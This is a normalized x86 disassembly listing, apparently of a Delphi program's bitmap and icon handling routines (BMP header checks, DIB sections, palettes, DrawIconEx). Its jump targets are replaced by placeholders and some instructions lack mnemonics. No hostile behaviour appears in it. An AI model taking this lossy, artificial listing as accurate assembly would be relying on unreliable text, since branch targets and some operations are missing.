mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_42d0ec
pop edx
pop edi
pop esi
pop ebx
retn
sub_42cb84
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4027b4
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_42d0a1
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_42d074
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402da4
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_428028
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41de40
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402da4
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41ddd0
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_4282b8
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_4282d8
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_41ddd0
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_428148
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_42cfef
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_428580
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4027b4
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_42cf57
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41ddd0
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_428148
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_42cf2b
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_428838
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40d244
call sub_428028
jmp r-xdata
xor eax eax
push ebp
push sub_42cfbe
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41ddd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cf32
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cff6
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40d244
call sub_428028
jmp r-xdata
sub_42cf32
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4027d4
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_42cff6
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402da4
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_42d08b
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_428838
mov [ ebp - 0x30 ] eax
sub_42d0a8
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_42ca5c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42d0ec
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42c7ec
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_41ddd0
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402da4
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_42ca5c
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_42cb84
call sub_428028
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_42d15c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_42c7ec
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402da4
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_42be04
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_42d1f7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42ca5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42d220
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_42c6a8
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_42c7ec
mov eax esi
call sub_42c8fc
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_42c7ec
mov eax esi
call sub_42c8fc
mov eax esi
call sub_42c778
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_42be04
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_42c208
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_42ca5c
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_42ca5c
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_42b7a0
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42d358
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_42c7fc
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_42c208
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42d3ac
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_42c7fc
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_42c208
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42d42c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_42c7ec
mov eax ebx
call sub_42c7fc
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_42b7a0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42d4c3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42ca5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_42b698
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_4260ac
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_42d4c8
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_403b84
call sub_403bd8
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_42b698
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42d500
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_42c7fc
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_42c208
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42d55c
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402da4
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_42c778
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_428f8c
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41de08
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41de08
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402da4
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_42c63c
mov dl [ r-xdata ]
call sub_427e24
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_428148
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_42b754
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41de08
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_41de08
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41de08
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_41de08
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_41de08
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_41de08
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_4285b8
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_41de08
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_4288dc
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_42d814
push ebx
mov ebx eax
mov eax ebx
call sub_42c7fc
mov edx ebx
mov eax ebx
call sub_42c2c8
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x8 ]
mov ecx edx
cmp edx [ eax + 0x14 ]
jne r-xdata
xor edx edx
mov [ eax + 0x8 ] edx
mov eax ecx
pop ebx
retn
xor edx edx
mov [ eax + 0x14 ] edx
xor edx edx
mov [ eax + 0x2c ] edx
sub_42d848
push ebx
mov ebx eax
mov eax ebx
call sub_42c7fc
mov edx ebx
mov eax ebx
call sub_42c2c8
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x10 ]
xor ecx ecx
mov [ eax + 0x10 ] ecx
mov eax edx
pop ebx
retn
sub_42d874
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_42c7fc
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_42b7a0
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_42d8ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_42be04
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42d914
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403390
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_42d95c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4292c8
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_42b5cc
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_42d9b0
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_42b5d0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41bc24
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_42d9e0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_42dcb8
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_42b5cc
mov eax [ esi + 0x28 ]
call sub_42b5d0
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_41bc50
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_42da40
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_427e24
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_42da98
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_42dad4
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_41dbc4
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_41ddd0
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_428b88
jmp r-xdata
jmp r-xdata
call sub_428034
sub_42db4c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42dbd9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_42da98
cmp eax [ rw-data ]
jne r-xdata
call sub_428034
mov eax esi
call sub_42da98
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_4290cc
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402da4
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41de08
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_42dc00
push ebp
mov ebp esp
add esp 0xfffffff4
